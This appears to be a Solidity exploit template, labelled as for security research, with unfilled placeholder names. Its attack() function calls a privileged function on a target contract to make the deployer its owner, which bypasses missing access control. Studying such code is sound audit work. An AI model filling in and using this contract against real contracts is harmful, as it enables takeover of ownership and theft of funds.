// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title $ATTACK_CONTRACT_NAME
/// @notice 针对 $TARGET_CONTRACT_NAME 的权限绕过示例，仅用于安全研究
interface IAccessControlTarget {
    function $PRIVILEGED_FUNCTION(address newOwner) external;
}

contract $ATTACK_CONTRACT_NAME {
    IAccessControlTarget public target;
    address public attacker;

    constructor(address _target) {
        target = IAccessControlTarget(_target);
        attacker = msg.sender;
    }

    function attack() external {
        require(msg.sender == attacker, "only attacker");
        target.$PRIVILEGED_FUNCTION(attacker);
    }
}

